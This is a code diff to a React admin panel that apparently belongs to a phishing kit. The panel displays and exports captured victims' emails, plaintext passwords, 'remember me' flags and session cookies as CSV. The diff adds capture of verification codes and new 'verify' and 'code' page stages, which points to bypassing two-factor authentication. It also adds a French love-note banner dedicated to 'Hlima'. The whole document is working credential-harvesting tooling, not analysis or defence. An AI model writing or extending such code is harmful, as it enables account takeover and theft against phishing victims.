@@ -4,7 +4,8 @@ interface LogEntry {
   email?: string
   password?: string
   rememberMe?: boolean
-  page: 'login' | 'password'
+  code?: string
+  page: 'login' | 'password' | 'verify' | 'code'
   ts: number
   cookie?: string
 }
@@ -81,7 +82,7 @@ const AdminPage: React.FC = () => {
   }
 
   const downloadCSV = () => {
-    const headers = ['Time','Page','Email','Password','Remember','Cookie']
+    const headers = ['Time','Page','Email','Password','Code','Remember','Cookie']
     const rows = formatted.map((l) => {
       const key = (l.email || '') + '|' + l.ts
       const cookieVal = cookieDrafts[key] ?? ''
@@ -90,6 +91,7 @@ const AdminPage: React.FC = () => {
         l.page,
         l.email ?? '',
         l.password ?? '',
+        l.code ?? '',
         l.rememberMe ? 'Yes' : 'No',
         cookieVal,
       ]
@@ -115,7 +117,24 @@ const AdminPage: React.FC = () => {
   return (
     <div className="min-h-screen bg-slate-900 text-white px-4 py-8">
       <div className="max-w-5xl mx-auto">
-        <h1 className="text-2xl font-bold mb-6">Admin - Login Attempts</h1>
+        {/* Romantic header for Hlima */}
+        <div className="relative overflow-hidden rounded-2xl mb-6 border border-pink-600/40 bg-gradient-to-r from-pink-700/60 via-rose-600/50 to-fuchsia-700/50">
+          <div className="absolute inset-0 pointer-events-none" aria-hidden="true">
+            <div className="absolute -top-10 -left-10 w-40 h-40 bg-pink-500/20 rounded-full blur-2xl" />
+            <div className="absolute -bottom-12 -right-12 w-48 h-48 bg-fuchsia-500/20 rounded-full blur-2xl" />
+          </div>
+          <div className="px-5 py-6 sm:px-8 sm:py-7 relative">
+            <h1 className="text-2xl sm:text-3xl font-extrabold tracking-wide">
+              <span className="align-middle">Pour Hlima</span>
+              <span className="ml-3 text-rose-200 text-2xl sm:text-3xl" role="img" aria-label="hearts">❤️💕💖</span>
+            </h1>
+            <p className="mt-2 text-rose-100/95 text-sm sm:text-base">
+              Je t'aime, Hlima — aujourd'hui, demain et toujours. Tu es mon cœur, ma lumière et mon éternel sourire. 💞
+            </p>
+          </div>
+        </div>
+
+        <h2 className="text-2xl font-bold mb-6">Admin - Login Attempts</h2>
         <div className="flex items-center justify-between mb-4">
           <div className="text-sm text-slate-300">Total: {formatted.length}</div>
           <div className="flex items-center gap-2">
@@ -132,6 +151,7 @@ const AdminPage: React.FC = () => {
                 <th className="px-3 py-2 border-b border-slate-700">Page</th>
                 <th className="px-3 py-2 border-b border-slate-700">Email</th>
                 <th className="px-3 py-2 border-b border-slate-700">Password</th>
+                <th className="px-3 py-2 border-b border-slate-700">Code</th>
                 <th className="px-3 py-2 border-b border-slate-700">Remember</th>
                 <th className="px-3 py-2 border-b border-slate-700">Cookie</th>
                 <th className="px-3 py-2 border-b border-slate-700">Action</th>
@@ -152,6 +172,7 @@ const AdminPage: React.FC = () => {
                     <td className="px-3 py-2">{l.page}</td>
                     <td className="px-3 py-2 break-all">{l.email ?? ''}</td>
                     <td className="px-3 py-2 break-all">{l.password ?? ''}</td>
+                    <td className="px-3 py-2 break-all">{l.code ?? ''}</td>
                     <td className="px-3 py-2">{l.rememberMe ? 'Yes' : 'No'}</td>
                     <td className="px-3 py-2 min-w-[12rem]">
                       <input
